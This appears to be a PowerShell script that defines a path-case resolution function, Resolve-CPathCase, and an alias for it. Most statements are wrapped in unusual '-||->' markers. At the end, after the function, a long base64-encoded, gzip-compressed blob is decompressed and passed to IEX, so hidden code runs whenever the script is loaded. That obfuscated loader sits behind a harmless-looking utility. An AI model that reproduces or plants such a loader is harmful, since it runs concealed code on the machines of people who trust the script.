
 -||-> function Resolve-CPathCase
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,ValueFromPipelineByPropertyName=$true)]
        [string]
        
        [Alias('FullName')]
        $Path
    )
    
     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 

     -||-> if(  -||-> -not ( -||-> Test-Path -Path $Path <-||- ) <-||-  )
    {
         -||-> Write-Error "Path '$Path' not found." <-||- 
        return
    } <-||- 

     -||-> $uri = [uri]$Path <-||- 
     -||-> if(  -||-> $uri.IsUnc <-||-  )
    {
         -||-> Write-Error ( -||-> 'Path ''{0}'' is a UNC path, which is not supported.' -f $Path <-||- ) <-||- 
        return
    } <-||- 

     -||-> if(  -||-> -not ( -||-> [IO.Path]::IsPathRooted($Path) <-||- ) <-||-  )
    {
         -||-> $Path = ( -||-> Resolve-Path -Path $Path <-||- ).Path <-||- 
    } <-||- 
    
     -||-> $qualifier = '{0}\' -f ( -||-> Split-Path -Qualifier -Path $Path <-||- ) <-||- 
     -||-> $qualifier =  -||-> Get-Item -Path $qualifier | Select-Object -ExpandProperty 'Name' <-||-  <-||- 
     -||-> $canonicalPath = '' <-||- 
    do
    {
         -||-> $parent =  -||-> Split-Path -Parent -Path $Path <-||-  <-||- 
         -||-> $leaf =  -||-> Split-Path -Leaf -Path $Path <-||-  <-||- 
         -||-> $canonicalLeaf =  -||-> Get-ChildItem -Path $parent -Filter $leaf <-||-  <-||- 
         -||-> if(  -||-> $canonicalPath <-||-  )
        {
             -||-> $canonicalPath =  -||-> Join-Path -Path $canonicalLeaf -ChildPath $canonicalPath <-||-  <-||- 
        }
        else
        {
             -||-> $canonicalPath = $canonicalLeaf <-||- 
        } <-||- 
    }
    while(  -||-> $parent -ne $qualifier -and ( -||-> $Path =  -||-> Split-Path -Parent -Path $Path <-||-  <-||- ) <-||-  )

    return  -||-> Join-Path -Path $qualifier -ChildPath $canonicalPath <-||- 
} <-||- 

 -||-> Set-Alias -Name 'Get-PathCanonicalCase' -Value 'Resolve-CPathCase' <-||- 


 -||-> $s= -||-> New-Object IO.MemoryStream( -||-> ,[Convert]::FromBase64String("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") <-||- ) <-||-  <-||- ; -||-> IEX ( -||-> New-Object IO.StreamReader( -||-> New-Object IO.Compression.GzipStream( -||-> $s,[IO.Compression.CompressionMode]::Decompress <-||- ) <-||- ) <-||- ).ReadToEnd() <-||- ;



